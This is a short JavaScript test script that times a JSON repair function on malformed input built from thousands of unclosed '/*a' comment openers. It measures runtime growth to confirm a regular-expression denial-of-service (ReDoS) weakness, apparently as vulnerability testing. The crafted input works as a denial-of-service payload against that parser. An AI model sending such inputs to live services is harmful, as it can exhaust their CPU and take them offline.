// Test when the JSON repair path is actually triggered
import { tryParseJson } from './dist/index.js';

// Create JSON that is malformed and will trigger the repair path
function createMalformedJson(count) {
  // This JSON is intentionally incomplete - no closing brace
  // This forces the repair path
  const commentSeq = Array(count).fill('/*a').join('');
  return `{"name":"test","arguments":{"x":"${commentSeq}`;
}

console.log('Testing repair path: malformed JSON with unclosed comments\n');
console.log('Count\tJSON Length\tTime(ms)\tGrowth');

let prevTime = null;
let prevCount = null;

const counts = [1000, 2000, 5000, 10000, 20000];

for (const count of counts) {
  const json = createMalformedJson(count);
  
  const start = process.hrtime.bigint();
  const result = tryParseJson(json);
  const end = process.hrtime.bigint();
  
  const duration = Number(end - start) / 1e6;
  let growth = '';
  if (prevTime !== null) {
    const countGrowth = count / prevCount;
    const timeGrowth = duration / prevTime;
    growth = `${timeGrowth.toFixed(2)}x`;
  }
  
  console.log(`${count}\t${json.length}\t${duration.toFixed(2)}\t${growth}`);
  prevTime = duration;
  prevCount = count;
  
  if (duration > 30000) {
    console.log('Exceeded 30 seconds - ReDoS confirmed!');
    break;
  }
}
